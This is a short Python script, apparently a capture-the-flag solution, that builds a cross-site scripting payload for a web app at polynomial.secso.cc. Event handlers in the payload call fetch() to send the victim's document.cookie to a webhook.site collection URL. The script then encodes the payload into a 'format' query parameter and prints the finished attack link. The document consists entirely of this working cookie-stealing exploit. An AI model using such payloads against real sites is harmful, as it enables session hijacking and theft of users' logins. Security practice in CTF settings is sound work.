import json, urllib.parse, sys
WB = "https://webhook.site/<webhook-token>"
code_hash = "fetch('%s/h-'+encodeURIComponent(document.cookie))" % WB
code_rej  = "fetch('%s/r-'+encodeURIComponent(document.cookie))" % WB
# main payload: force ASI with `void`, set onhashchange handler, trigger fragment nav,
# also set onunhandledrejection and create an unhandled rejection
payload = ("\nvoid [onhashchange=\"%s\"][location=\"#x\"]"
           ",void [onunhandledrejection=\"%s\"]"
           ",Promise.reject") % (code_hash, code_rej)
open('payload.txt','w').write(payload)
print("PAYLOAD:", json.dumps(payload))
print()
qs = urllib.parse.urlencode({"x":"1","y":"2","formula":"x+y","format":payload,"autoEval":"1"})
full = "/?" + qs
print("FULL PATH:", full)
print()
print("URL:", "https://polynomial.secso.cc" + full)
